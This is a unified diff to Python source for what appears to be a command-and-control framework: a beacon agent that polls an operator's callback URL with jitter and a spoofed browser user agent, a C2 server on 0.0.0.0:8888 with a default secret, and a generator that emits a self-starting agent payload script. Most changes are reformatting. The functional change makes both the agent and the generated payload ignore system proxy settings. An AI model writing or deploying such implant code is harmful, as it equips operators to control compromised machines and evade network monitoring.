@@ -37,8 +37,14 @@ class BeaconTask:
 
 
 class BeaconAgent:
-    def __init__(self, agent_id: str, callback_url: str, interval: float = 5.0,
-                 jitter: float = 0.3, user_agent: str = "Mozilla/5.0"):
+    def __init__(
+        self,
+        agent_id: str,
+        callback_url: str,
+        interval: float = 5.0,
+        jitter: float = 0.3,
+        user_agent: str = "Mozilla/5.0",
+    ):
         self.agent_id = agent_id
         self.callback_url = callback_url.rstrip("/")
         self.interval = interval
@@ -80,7 +86,11 @@ class BeaconAgent:
 
     def _beacon_loop(self):
         import requests as req
+
         sess = req.Session()
+        # Beacons talk to the operator's own C2 endpoint; system proxies must
+        # not intercept loopback/private callback addresses.
+        sess.trust_env = False
         sess.headers.update({"User-Agent": self.user_agent})
 
         while self._running:
@@ -137,8 +147,7 @@ class BeaconAgent:
 
 
 class C2Server:
-    def __init__(self, bind_host: str = "0.0.0.0", bind_port: int = 8888,
-                 secret: str = "changeme"):
+    def __init__(self, bind_host: str = "0.0.0.0", bind_port: int = 8888, secret: str = "changeme"):
         self.bind_host = bind_host
         self.bind_port = bind_port
         self.secret = secret
@@ -228,10 +237,11 @@ class C2Server:
         return agent.get("results", {})
 
 
-def generate_agent_payload(server_url: str, agent_id: Optional[str] = None,
-                            interval: float = 5.0) -> str:
+def generate_agent_payload(
+    server_url: str, agent_id: Optional[str] = None, interval: float = 5.0
+) -> str:
     aid = agent_id or uuid.uuid4().hex[:8]
-    code = '''import json,threading,queue,time,random,uuid,requests as req
+    code = """import json,threading,queue,time,random,uuid,requests as req
 class BeaconTask:
     def __init__(self,cmd,task_id=None):
         self.task_id=task_id or uuid.uuid4().hex[:12]
@@ -246,7 +256,7 @@ class BeaconAgent:
         self.task_queue=queue.Queue();self.results={};self._running=True
         self._session_id=uuid.uuid4().hex[:8]
     def start(self):
-        import requests as r; s=r.Session(); s.headers.update({'User-Agent':self.user_agent})
+        import requests as r; s=r.Session(); s.trust_env=False; s.headers.update({'User-Agent':self.user_agent})
         while self._running:
             try:
                 time.sleep(max(0.5,self.interval+random.uniform(-self.jitter,self.jitter)*self.interval))
@@ -270,5 +280,5 @@ id="%s"; cb="%s"; i=%s
 a=BeaconAgent(id,cb,interval=i)
 t=threading.Thread(target=a.start,daemon=True);t.start()
 import atexit;atexit.register(a.stop)
-''' % (aid, server_url, interval)
+""" % (aid, server_url, interval)
     return code
